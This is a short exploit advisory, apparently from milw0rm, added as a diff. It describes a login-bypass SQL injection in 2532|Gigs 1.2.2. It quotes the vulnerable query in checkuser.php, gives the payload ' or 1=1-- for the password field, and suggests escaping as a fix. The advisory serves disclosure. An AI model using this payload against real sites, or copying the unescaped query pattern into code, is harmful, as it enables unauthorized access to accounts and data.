@@ -1,0 +1,30 @@
+/* ------------------------------------------------------------------------------------------------
+ * 2532|Gigs 1.2.2 Stable Remote Login Bypass Vulnerability
+ * ------------------------------------------------------------------------------------------------
+ * by athos - staker[at]hotmail[dot]it
+ * http://www.hotscripts.com/jump.php?listing_id=65863&jump_type=1
+ * ------------------------------------------------------------------------------------------------
+ * File Vuln checkuser.php
+ *
+ * 16. $username = $_POST['username'];
+ * 17. $password = $_POST['password'];
+ * ... 
+ * 41. $query = "SELECT * FROM $dbt_users WHERE username = '$username' AND password = '$password'" ;
+ * 42. $result = mysql_query($query) or die ( "Error in query: $query. " . mysql_error() );
+ * ------------------------------------------------------------------------------------------------
+ * Exploit
+ *
+ * http://[host]/[path]/index.php?id=login
+ * 
+ * Username: [username]
+ * Password: [' or 1=1--]
+ * ------------------------------------------------------------------------------------------------
+ * Fix (Examples)
+ *  
+ * $username = mysql_real_escape_string($_POST['username']); 
+ * $password = mysql_real_escape_string($_POST['password']);
+ * 
+ * ------------------------------------------------------------------------------------------------
+ */
+
+# milw0rm.com [2008-12-18]
